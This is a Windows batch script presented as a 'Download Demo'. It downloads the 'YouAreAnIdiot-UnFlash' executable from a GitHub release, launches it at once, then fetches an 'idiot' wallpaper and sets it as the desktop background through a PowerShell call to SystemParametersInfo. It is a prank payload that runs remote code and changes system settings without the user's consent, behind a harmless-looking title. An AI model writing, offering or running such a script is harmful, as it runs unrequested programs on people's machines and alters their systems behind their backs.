@echo off
setlocal
title Download Demo

set "URL=https://github.com/orangegrouptech/YouAreAnIdiot-UnFlash/releases/download/1.0.1/YouAreAnIdiot-UnFlash.exe"
set "FILE=%USERPROFILE%\Downloads\YouAreAnIdiot-UnFlash.exe"

echo Downloading the demo file...
echo Destination: %FILE%
echo.

curl.exe -fL "%URL%" -o "%FILE%"

if errorlevel 1 (
    echo Download failed.
    pause
    exit /b 1
)

if not exist "%FILE%" (
    echo File was not created.
    pause
    exit /b 1
)

echo.
echo Download complete.

if errorlevel 2 (
    echo File saved without launching.
    pause
    exit /b 0
)

start "" "%FILE%"

set "url=https://wallpapercave.com/download/idiot-wallpapers-wp5157443"
set "downloadPath=%TEMP%\wallpaper.jpg"

powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%downloadPath%'"

powershell -Command "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Wallpaper { [DllImport(\"user32.dll\", CharSet = CharSet.Auto)] public static extern int SystemParametersInfo(int uAction, int uParam, string lvParam, int fuWinIni); }'; [Wallpaper]::SystemParametersInfo(0x0014, 0, '%downloadPath%', 0x01 -bor 0x02)"

